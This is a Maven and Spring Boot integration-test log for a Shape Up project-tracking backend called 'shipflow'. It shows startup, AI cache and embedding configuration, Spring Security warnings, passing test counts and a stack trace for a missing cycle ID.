2026-01-17T23:26:22.288Z  WARN 89700 --- [shipflow] [           main] org.hibernate.orm.deprecation            : HHH90000025: H2Dialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
2026-01-17T23:26:23.025Z  INFO 89700 --- [shipflow] [           main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:23.175Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:23.176Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:23.176Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:24.605Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.QAConfig           : Initializing embedding model: all-MiniLM-L6-v2
2026-01-17T23:26:29.914Z  INFO 89700 --- [shipflow] [           main] ai.djl.util.Platform                     : Found matching platform from: jar:file:/Users/farzad/.m2/repository/ai/djl/huggingface/tokenizers/0.28.0/tokenizers-0.28.0.jar!/native/lib/tokenizers.properties
2026-01-17T23:26:29.948Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.QAConfig           : Initializing in-memory embedding store for development
2026-01-17T23:26:30.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AIConfig           : Initializing AI with RunPod Serverless GPU - Model: mistral:instruct, URL: http://localhost:8080/mock
2026-01-17T23:26:30.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ConversationManager   : ConversationManager initialized with in-memory provider
2026-01-17T23:26:30.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : FeedbackLearningService initialized with in-memory provider
2026-01-17T23:26:30.329Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : LLMCacheService initialized with in-memory provider
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/index.html']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/favicon.ico']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/favicon.svg']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/assets/**']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.js']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.css']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.png']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.svg']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.ico']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.json']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.woff']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.woff2']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.005Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.ttf']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:31.385Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.ShipFlowApplicationTests  : Started ShipFlowApplicationTests in 10.505 seconds (process running for 16.836)
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 10.59 s -- in com.github.farzadsedaghatbin.shipflow.ShipFlowApplicationTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.WorkLogControllerIntegrationTest

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.2.1)

2026-01-17T23:26:31.468Z  INFO 89700 --- [shipflow] [           main] g.f.s.c.WorkLogControllerIntegrationTest : Starting WorkLogControllerIntegrationTest using Java 21.0.2 with PID 89700 (started by farzad in /Users/farzad/IdeaProjects/git/shapeup-tracker/backend)
2026-01-17T23:26:31.468Z DEBUG 89700 --- [shipflow] [           main] g.f.s.c.WorkLogControllerIntegrationTest : Running with Spring Boot v3.2.1, Spring v6.1.2
2026-01-17T23:26:31.468Z  INFO 89700 --- [shipflow] [           main] g.f.s.c.WorkLogControllerIntegrationTest : The following 1 profile is active: "test"
2026-01-17T23:26:31.813Z  INFO 89700 --- [shipflow] [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
2026-01-17T23:26:31.814Z  INFO 89700 --- [shipflow] [           main] o.h.c.internal.RegionFactoryInitiator    : HHH000026: Second-level cache disabled
2026-01-17T23:26:31.816Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-2 - Starting...
2026-01-17T23:26:31.817Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.pool.HikariPool        : HikariPool-2 - Added connection conn30: url=jdbc:h2:mem:testdb user=SA
2026-01-17T23:26:31.817Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-2 - Start completed.
2026-01-17T23:26:31.817Z  WARN 89700 --- [shipflow] [           main] org.hibernate.orm.deprecation            : HHH90000025: H2Dialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
2026-01-17T23:26:32.076Z  INFO 89700 --- [shipflow] [           main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:32.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:32.158Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:32.158Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:32.158Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:32.559Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.QAConfig           : Initializing embedding model: all-MiniLM-L6-v2
2026-01-17T23:26:32.561Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.QAConfig           : Initializing in-memory embedding store for development
2026-01-17T23:26:32.588Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AIConfig           : Initializing AI with RunPod Serverless GPU - Model: mistral:instruct, URL: http://localhost:8080/mock
2026-01-17T23:26:32.768Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ConversationManager   : ConversationManager initialized with in-memory provider
2026-01-17T23:26:32.769Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : FeedbackLearningService initialized with in-memory provider
2026-01-17T23:26:32.770Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : LLMCacheService initialized with in-memory provider
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/index.html']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/favicon.ico']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/favicon.svg']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/assets/**']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.js']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.css']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.png']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.svg']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.ico']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.json']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.woff']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.woff2']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.058Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.ttf']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:33.214Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.JwtAuthenticationFilter        : Filter 'jwtAuthenticationFilter' configured for use
2026-01-17T23:26:33.229Z  INFO 89700 --- [shipflow] [           main] g.f.s.c.WorkLogControllerIntegrationTest : Started WorkLogControllerIntegrationTest in 1.771 seconds (process running for 18.68)
2026-01-17T23:26:33.412Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for pitch 5
2026-01-17T23:26:33.412Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for cycle 5
2026-01-17T23:26:33.479Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling work log event for work log ID: 6
2026-01-17T23:26:33.529Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: worklog_6_0
2026-01-17T23:26:33.529Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested work log: ID: 6
2026-01-17T23:26:33.529Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for pitch 6
2026-01-17T23:26:33.529Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for cycle 6
2026-01-17T23:26:33.543Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling work log event for work log ID: 8
2026-01-17T23:26:33.551Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: worklog_8_0
2026-01-17T23:26:33.551Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested work log: ID: 8
2026-01-17T23:26:33.551Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for pitch 7
2026-01-17T23:26:33.551Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for cycle 7
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 2.129 s -- in com.github.farzadsedaghatbin.shipflow.controller.WorkLogControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest$PdfExportTests

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.2.1)

2026-01-17T23:26:33.580Z  INFO 89700 --- [shipflow] [           main] .g.f.s.c.ReportControllerIntegrationTest : Starting ReportControllerIntegrationTest using Java 21.0.2 with PID 89700 (started by farzad in /Users/farzad/IdeaProjects/git/shapeup-tracker/backend)
2026-01-17T23:26:33.580Z DEBUG 89700 --- [shipflow] [           main] .g.f.s.c.ReportControllerIntegrationTest : Running with Spring Boot v3.2.1, Spring v6.1.2
2026-01-17T23:26:33.580Z  INFO 89700 --- [shipflow] [           main] .g.f.s.c.ReportControllerIntegrationTest : The following 1 profile is active: "test"
2026-01-17T23:26:34.009Z  INFO 89700 --- [shipflow] [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
2026-01-17T23:26:34.011Z  INFO 89700 --- [shipflow] [           main] o.h.c.internal.RegionFactoryInitiator    : HHH000026: Second-level cache disabled
2026-01-17T23:26:34.014Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-3 - Starting...
2026-01-17T23:26:34.015Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.pool.HikariPool        : HikariPool-3 - Added connection conn40: url=jdbc:h2:mem:testdb user=SA
2026-01-17T23:26:34.015Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-3 - Start completed.
2026-01-17T23:26:34.015Z  WARN 89700 --- [shipflow] [           main] org.hibernate.orm.deprecation            : HHH90000025: H2Dialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
2026-01-17T23:26:34.530Z  INFO 89700 --- [shipflow] [           main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:34.622Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:35.916Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.QAConfig           : Initializing embedding model: all-MiniLM-L6-v2
2026-01-17T23:26:35.919Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.QAConfig           : Initializing in-memory embedding store for development
2026-01-17T23:26:36.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AIConfig           : Initializing AI with RunPod Serverless GPU - Model: mistral:instruct, URL: http://localhost:8080/mock
2026-01-17T23:26:36.482Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ConversationManager   : ConversationManager initialized with in-memory provider
2026-01-17T23:26:36.486Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : FeedbackLearningService initialized with in-memory provider
2026-01-17T23:26:36.488Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : LLMCacheService initialized with in-memory provider
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/index.html']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/favicon.ico']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/favicon.svg']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/assets/**']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.js']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.css']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.png']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.svg']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.ico']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.json']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.woff']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.woff2']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.119Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.ttf']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:37.356Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.JwtAuthenticationFilter        : Filter 'jwtAuthenticationFilter' configured for use
2026-01-17T23:26:37.374Z  INFO 89700 --- [shipflow] [           main] .g.f.s.c.ReportControllerIntegrationTest : Started ReportControllerIntegrationTest in 3.802 seconds (process running for 22.825)
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 3.826 s -- in com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest$PdfExportTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest$CsvExportTests
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.010 s -- in com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest$CsvExportTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest$GetEnhancedReportTests
2026-01-17T23:26:37.469Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.e.GlobalExceptionHandler         : Unexpected runtime exception: Cycle not found with id: 999

java.lang.RuntimeException: Cycle not found with id: 999
	at com.github.farzadsedaghatbin.shipflow.service.ReportService.getEnhancedCycleReport(ReportService.java:410) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.ReportController.getEnhancedCycleReport(ReportController.java:36) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
